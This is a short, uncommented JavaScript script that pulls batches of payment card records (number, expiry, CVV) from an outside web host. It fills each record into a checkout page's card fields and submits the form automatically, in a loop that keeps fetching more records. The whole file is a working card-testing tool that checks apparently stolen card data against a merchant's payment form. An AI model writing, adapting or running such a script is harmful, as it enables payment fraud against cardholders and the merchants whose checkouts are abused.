var postUrl = "https://altenen.herokuapp.com/post";
var iteration = null;
var options = {
     url:postUrl,
     dataType: "jsonp"
};
var cards = function(arr) {
	var i = 0;
        var len = arr.length;

	iteration = function() {
	  if( i < len ) {
	    var json = arr[i++];
	    sessionStorage.card = JSON.stringify( json );

	    $("#cardNumber").val(json.card);

	    $("#expirationMonth").val(json.mon);
            $("#expirationYear").val("20" + json.year);
	    $("#cvc").val(json.cvv);
	    $("#ProcessButton").click();
	  }
	  else {
	    $.ajax(options)
	    .success(cards);
	  }

	}

	iteration();
};
$.ajax(options)
.success(cards);